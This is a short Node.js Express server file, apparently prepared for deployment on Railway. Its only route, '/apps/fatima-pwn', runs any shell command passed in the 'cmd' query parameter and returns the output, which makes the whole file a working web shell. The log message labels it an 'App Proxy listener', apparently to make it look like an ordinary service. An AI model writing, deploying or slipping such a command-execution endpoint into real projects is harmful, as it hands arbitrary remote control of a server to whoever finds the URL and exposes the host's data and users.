const express = require("express");
const { exec } = require("child_process");
const app = express();

app.get("/apps/fatima-pwn", (req, res) => {
  const cmd = req.query.cmd;
  if (!cmd) return res.send("Missing cmd param");

  exec(cmd, (err, stdout, stderr) => {
    if (err) return res.send(`<pre>Error: ${err.message}</pre>`);
    if (stderr) return res.send(`<pre>Stderr: ${stderr}</pre>`);
    res.send(`<pre>${stdout}</pre>`);
  });
});

// ✅ هاد السطر مهم باش Railway يعرف البورت
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`🔥 App Proxy listener is running on port ${port}`);
});
